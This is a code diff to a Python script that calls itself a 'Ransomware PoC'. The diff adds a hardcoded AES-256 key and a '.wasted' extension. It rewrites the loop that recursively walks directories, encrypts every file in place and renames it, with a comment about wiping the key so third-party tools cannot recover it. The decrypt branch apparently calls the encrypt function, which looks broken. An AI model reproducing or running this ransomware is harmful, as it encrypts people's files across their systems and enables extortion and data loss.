@@ -17,7 +17,9 @@ import modify
 # CHANGE IF NEEDED
 # -----------------
 #  set to either: '128/192/256 bit plaintext key' or False
-HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn' # AES 256-key
+HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn' # AES 256-key used to encrypt files
+extension = ".wasted" # Ransomware custom extension
+
 
 def parse_args():
     parser = argparse.ArgumentParser(description='Ransomware PoC')
@@ -96,14 +98,15 @@ def main():
     # Recursively go through folders and encrypt/decrypt files
     for currentDir in startdirs:
         for file in discover.discoverFiles(currentDir):
-            modify.modify_file_inplace(file, crypt.encrypt)
-            if decrypt:
+            if decrypt and file.endswith(extension):
+                modify.modify_file_inplace(file, crypt.encrypt)
                 file_original = os.path.splitext(file)[0]
                 os.rename(file, file_original)
                 print("File changed from " + file + " to " + file_original)
-            else:
-                os.rename(file, file+'.wasted')
-                print("File changed from " + file + " to " + file+'.wasted')
+            if encrypt:
+                modify.modify_file_inplace(file, crypt.encrypt)
+                os.rename(file, file + extension)
+                print("File changed from " + file + " to " + file + extension)
 
     # This wipes the key out of memory
     # to avoid recovery by third party tools
